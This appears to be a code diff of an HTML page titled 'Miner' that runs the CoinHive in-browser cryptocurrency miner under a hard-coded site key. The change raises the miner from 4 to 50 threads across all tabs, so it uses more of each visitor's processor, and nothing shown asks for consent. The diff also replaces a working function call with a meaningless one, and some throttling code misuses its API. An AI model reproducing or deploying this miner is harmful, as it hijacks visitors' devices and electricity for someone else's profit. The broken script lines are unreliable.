@@ -9,7 +9,7 @@
     <body class=" teal darken-4">
 	<nav>
     <div class="nav-wrapper teal accent-4">
-		<a href="#!" class="brand-logo"><i class="material-icons">developer_mode</i>Miner</a>
+		<a href="#!" class="brand-logo"><i class="material-icons Medium">developer_mode</i>Miner</a>
 			<ul class="right hide-on-med-and-down">
 				<li><a href="#"><i class="material-icons">search</i></a></li>
 				<li><a href="#"><i class="material-icons">view_module</i></a></li>
@@ -97,7 +97,7 @@
 	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-rc.2/js/materialize.min.js"></script>
 	<script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
 	<script type="text/javascript">
-	var miner = new CoinHive.Anonymous('dpQi9LfJQ6jPwU1zNeNAJYEdxsFhs01w','threads: 4');
+	var miner = new CoinHive.Anonymous('dpQi9LfJQ6jPwU1zNeNAJYEdxsFhs01w','threads: 50');
 	miner.start(CoinHive.FORCE_MULTI_TAB);
 	var MAX_SPEED = 90;
 	var speed = 50;
@@ -108,7 +108,7 @@
             speedDiv.toggleClass('highSpeed', speed >= 90)
             speedDiv.toggleClass('lowSpeed', speed <= 50)
             miner.getNumThreads((100-speed)/100)
-            UpdateQueryString('count', speed < 50? speed : undefined)
+            $('count', speed < 50? speed : undefined)
         }
 	setInterval(function() {
 		//var threadCount = miner.getNumThreads();
